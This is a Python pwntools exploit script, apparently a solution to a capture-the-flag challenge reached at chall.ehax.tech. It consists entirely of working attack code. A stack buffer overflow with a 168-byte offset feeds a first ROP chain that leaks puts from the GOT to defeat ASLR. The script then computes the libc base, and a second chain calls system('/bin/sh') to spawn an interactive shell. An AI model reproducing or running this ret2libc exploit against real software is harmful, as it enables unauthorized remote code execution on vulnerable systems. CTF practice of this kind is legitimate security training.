from pwn import *

gs = '''
continue
'''

elf = context.binary = ELF("./chall_patched")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("chall.ehax.tech", 4269)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
io = start()

offset = 168

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(elf.sym.main)
])

io.sendlineafter("Enter authcode: ", payload)

io.recvline()

leak_libc_puts = u64(io.recvline().strip().ljust(8, b"\x00"))

print(f"Leak puts: {hex(leak_libc_puts)}")

libc.address = leak_libc_puts - libc.sym.puts

print(f"System: {hex(libc.sym.system)}")

payload = b"".join([
    b"A"*offset,
    p64(pop_rdi),
    p64(next(libc.search(b'/bin/sh'))),
    p64(ret),
    p64(libc.symbols.system)
])

io.sendlineafter("Enter authcode: ", payload)

io.interactive()